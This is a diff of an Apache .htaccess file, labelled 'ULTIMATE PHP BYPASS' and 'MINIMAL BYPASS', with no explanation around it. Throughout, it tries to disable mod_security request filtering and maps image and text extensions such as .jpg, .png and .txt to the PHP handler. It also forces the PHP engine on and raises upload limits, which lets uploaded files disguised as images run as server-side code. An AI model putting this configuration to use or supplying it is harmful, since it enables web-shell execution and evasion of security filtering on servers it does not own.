@@ -1,16 +1,18 @@
-# ULTIMATE PHP BYPASS HTACCESS
-<FilesMatch "\.(php|php5|phtml|pl|php3|php4)$">
-    ForceType application/x-httpd-php
-</FilesMatch>
-
-# BYPASS ALL EXTENSIONS
-AddType application/x-httpd-php .php .jpg .png .gif .txt .html .htm .asp .jsp
-
-# DISABLE SECURITY
-<IfModule mod_security.c>
+# MINIMAL BYPASS .HTACCESS
+<IfModule LiteSpeed>
     SecFilterEngine Off
     SecFilterScanPOST Off
+    SetEnv noSecScan 1
 </IfModule>
 
-# NULL BYTE BYPASS
-SetEnvIf Request_URI "\.php.*$" force-php
+RemoveHandler .php
+AddHandler application/x-httpd-php .php .php* .phtml .jpg .png .gif .txt
+
+<FilesMatch "\.(php|phtml|jpg|png)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+php_flag engine on
+php_flag file_uploads on
+php_value upload_max_filesize 50M
+php_value post_max_size 55M
